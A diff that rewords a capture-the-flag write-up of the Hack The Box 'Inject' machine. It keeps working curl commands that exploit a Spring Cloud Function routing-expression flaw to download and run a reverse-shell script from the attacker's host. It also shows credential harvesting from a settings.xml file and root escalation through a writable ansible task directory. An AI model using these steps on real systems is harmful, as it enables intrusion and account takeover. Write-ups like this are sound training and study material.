@@ -100,51 +100,50 @@ After running the command, I checked the 'tmp' directory and found that the 'exp
 
 ### Initial access:
 
-To get the reverse shell I created a bash file to received reverse shell in my machine with below code :
+To establish a reverse shell, I created a bash file with the following code, which would receive the reverse shell in my machine:
 
 ![image](https://user-images.githubusercontent.com/87700008/224747729-b9ba917c-4be2-49e6-b1ce-4af09fcfc977.png)
 
-I started python3 http server & uploaded the bash file from my using using this command :
+Next, I started a Python 3 HTTP server and uploaded the bash file using the following command:
 
     curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"curl http://10.10.14.103/hell.sh -o /tmp/hell.sh")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
     
-And then I executed the uploaded bash script using this command & got the reverse shell : (pwn3d!🙂)
+Then, I executed the uploaded bash script using the following command and successfully obtained a reverse shell: (pwn3d!🙂)
 
     curl -i -s -k -X $'POST' -H $'Host: 10.10.11.204:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"bash /tmp/hell.sh")' --data-binary $'exploit_poc' $'http://10.10.11.204:8080/functionRouter'
     
 ![image](https://user-images.githubusercontent.com/87700008/224748383-0c601555-c767-47d3-a5e8-6fd011b8d18e.png)
 
-In Frank's home directory I found a directory called '.m2' so I thought to give it a look & in the folder I found a settings.xml file which contains Phil's password :
+While exploring Frank's home directory, I found a folder named ".m2". Curious, I took a look inside and found a "settings.xml" file that contained Phil's password:
 
 ![image](https://user-images.githubusercontent.com/87700008/224754633-7fbf629c-c60e-4624-b4de-e78adebc97b2.png)
 
 ![image](https://user-images.githubusercontent.com/87700008/224754874-d31ef599-37f2-4f96-96d3-7328ab8e31c0.png)
 
-I tried to login via SSH to Phil account with the gathered credential but I SSH was unsuccessfull. 😕
-But then I tried to directly switch user 'su phil' & this time I used the same password and I switched successfully. (pwn3d! 🙂)
+I tried to log in to Phil's account via SSH using the gathered credentials, but was unsuccessful. 😕
+However, I then tried switching directly to user "phil" using the same password, and this time I was successful. (pwn3d! 🙂)
 
-Now, that I have the Phil access I got the user flag.
+Now that I had access to Phil's account, I retrieved the user flag:
 
 ![image](https://user-images.githubusercontent.com/87700008/224756415-b5283543-5190-4b6a-a2b2-32ceafecdc22.png)
 
-## Priv Esc :
+## Privilege Escalation: :
 
-For Privilege escalation I used 'linpeas' script but didn't got any hint, I tried manual enumeratyion as well but no luck there as well.
+I attempted to use the 'linpeas' script for privilege escalation, but it didn't provide any useful information. I also tried manual enumeration but had no luck there either.
 
-Then I uploaded pspy binary to the Inject box & started checking the root process. I found that there is a process running called 'ansible-playbook' with root privileges :
+Next, I uploaded the pspy binary to the Inject box and started checking the root processes. I discovered a process called 'ansible-playbook' running with root privileges:
 
 ![image](https://user-images.githubusercontent.com/87700008/224776993-8622cded-e74f-4fdf-ad86-c7b1a865c672.png)
 
-I found an exploit here in [GTFO bins](https://gtfobins.github.io/gtfobins/ansible-playbook/) for the 'ansible-playbook'
+I found an exploit for 'ansible-playbook' on [GTFO bins](https://gtfobins.github.io/gtfobins/ansible-playbook/) for the 'ansible-playbook'
 
-This tool is found to automate all "*yml" files in the /task directory in which the playbook_1.yml file is discovered. This file is a fragment of an Ansible playbook file, which is a YAML file that contains a series of tasks that must be executed by Ansible on a set of hosts or on a specific host.
+This tool automates all "*yml" files in the /task directory, where the playbook_1.yml file is located. The file is a fragment of an Ansible playbook file, which is a YAML file containing a series of tasks that Ansible must execute on a set of hosts or on a specific host.
 
-When checked the "/opt/automation/tasks" directory I found that apart from "root", "staff" user is also having the access for writing into the task directory.
-And Phil is in the Staff user group :
+Upon checking the "/opt/automation/tasks" directory, I discovered that, in addition to "root," the "staff" user also has access to write to the task directory, and Phil is a member of the Staff user group:
 
 ![image](https://user-images.githubusercontent.com/87700008/224779114-b591dbc0-aae4-4700-99c1-399409b77c57.png)
 
-So, We can write into the 'task' directory & 'ansible-playbook' will run the file if the extension is ending with '.yml' hence I created a file inside the task directory named 'pe.yml' with the below code :
+Therefore, I created a file named 'pe.yml' inside the task directory with the following code:
 
 ```
 - hosts:  localhost
@@ -154,7 +153,7 @@ So, We can write into the 'task' directory & 'ansible-playbook' will run the fil
       become: true
 ```
 
-And after waiting for almost 1 minute I executed 'bash -p' & got the root access. (pwn3d!🙂)
+As long as a file with an extension ending in '.yml' is present in the 'task' directory, 'ansible-playbook' will execute it. After waiting for nearly a minute, I ran 'bash -p' and successfully gained root access (pwn3d!🙂).
 
 ![image](https://user-images.githubusercontent.com/87700008/224781075-83c23094-5233-4aa6-992d-ef768a0adb18.png)
 
